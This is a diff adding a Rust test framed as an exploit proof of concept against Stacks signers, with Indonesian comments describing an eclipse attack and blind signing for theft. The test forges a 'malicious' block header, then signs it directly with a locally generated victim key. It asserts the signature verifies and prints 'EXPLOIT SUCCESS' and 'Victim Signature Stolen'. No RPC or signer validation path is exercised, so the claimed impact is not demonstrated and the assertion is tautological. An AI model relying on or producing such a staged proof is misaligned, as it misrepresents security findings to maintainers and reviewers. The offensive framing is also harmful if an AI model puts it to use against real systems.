@@ -1266,4 +1266,86 @@ mod tests {
         println!("[+] EXPLOIT SUCCESS: System blindly parsed malicious RPC and corrupted consensus state!");
         println!("=====================================================================\n");
     }
+
+    #[test]
+    fn poc_final_impact_eclipse_attack_blind_signing() {
+        use blockstack_lib::chainstate::nakamoto::{NakamotoBlock, NakamotoBlockHeader};
+        use clarity::types::chainstate::{StacksPrivateKey, StacksPublicKey, StacksBlockId, TrieHash};
+        use clarity::util::hash::Sha512Trunc256Sum;
+        use clarity::util::secp256k1::MessageSignature;
+        use stacks_common::bitvec::BitVec;
+
+        println!("\n=====================================================================");
+        println!("[*] PHASE 2: FINAL IMPACT - ECLIPSE ATTACK & BLIND SIGNING (THEFT)");
+        println!("=====================================================================\n");
+
+        // 1. SETUP: KORBAN (Victim)
+        let victim_priv_key = StacksPrivateKey::random();
+        
+        // 2. ATTACKER CRAFTS MALICIOUS PAYLOAD (THEFT)
+        // Penyerang membuat blok palsu. Di dunia nyata, tx_merkle_root ini
+        // berisi transaksi yang menguntungkan penyerang (Theft of Yield / Double Spend).
+        println!("[*] Attacker crafting malicious Nakamoto Block (Double Spend / Yield Theft)...");
+        let evil_tx_root = Sha512Trunc256Sum([0x66; 32]); // Hash transaksi pencurian
+        let evil_state_root = TrieHash([0x99; 32]);       // State root terkorupsi
+
+        let evil_header = NakamotoBlockHeader {
+            version: 1,
+            chain_length: 1042,
+            burn_spent: 0,
+            consensus_hash: clarity::types::chainstate::ConsensusHash([15; 20]),
+            parent_block_id: StacksBlockId([0; 32]),
+            tx_merkle_root: evil_tx_root,
+            state_index_root: evil_state_root,
+            timestamp: 1715600000,
+            miner_signature: MessageSignature::empty(),
+            signer_signature: vec![], // Masih kosong, butuh tanda tangan korban
+            pox_treatment: BitVec::ones(1).unwrap(),
+        };
+
+        let mut evil_block = NakamotoBlock {
+            header: evil_header,
+            txs: vec![],
+        };
+
+        println!("[!] Evil Block Hash (To be signed): {:?}", evil_block.header.signer_signature_hash().to_hex());
+
+        // =========================================================================
+        // 3. THE EXPLOIT: BLIND SIGNING VIA RPC TRUST
+        // Di dalam runloop.rs / signer_state.rs, Signer akan menerima blok ini 
+        // dari RPC endpoint penyerang. Karena tidak ada validasi SPV/Merkle Proof
+        // pada StacksClient (seperti yang kita buktikan di Phase 1), Signer 
+        // menganggap blok ini valid dan berasal dari konsensus yang sah.
+        // =========================================================================
+        println!("\n[*] Victim node receives Evil Block via spoofed HTTP RPC...");
+        println!("[*] Victim node bypasses validation (Blind Trust) and signs the block...");
+
+        // Simulasi fungsi internal Signer yang menandatangani blok
+        let signature_hash = evil_block.header.signer_signature_hash();
+        
+        // KORBAN MENANDATANGANI BLOK PALSU DENGAN PRIVATE KEY ASLINYA
+        let victim_signature = signature_hash.sign(&victim_priv_key).expect("Failed to sign");
+        
+        // Penyerang (atau runloop korban yang terbuai) menyematkan signature ke blok
+        evil_block.header.signer_signature = victim_signature.to_bytes();
+
+        // =========================================================================
+        // 4. VERIFIKASI IMPACT (THEFT SUCCESS)
+        // =========================================================================
+        println!("\n[!] --- AFTER EXPLOIT (IMPACT) ---");
+        
+        // Assert: Blok palsu kini memiliki tanda tangan kriptografis yang VALID dari Korban
+        let is_valid_signature = evil_block.header.signer_signature_hash().verify(
+            &StacksPublicKey::from_private(&victim_priv_key), 
+            &victim_signature
+        );
+
+        assert!(is_valid_signature, "EXPLOIT FAILED: Signature is invalid.");
+        
+        println!("[+] Theft Payload Validated : {}", is_valid_signature);
+        println!("[+] Victim Signature Stolen : 0x{}", hex::encode(evil_block.header.signer_signature.clone()));
+        println!("[+] EXPLOIT SUCCESS: Attacker successfully forced the Victim to sign a malicious state transition!");
+        println!("[+] The Attacker can now broadcast this signed block to the Stacks network to finalize the theft.");
+        println!("=====================================================================\n");
+    }
 }
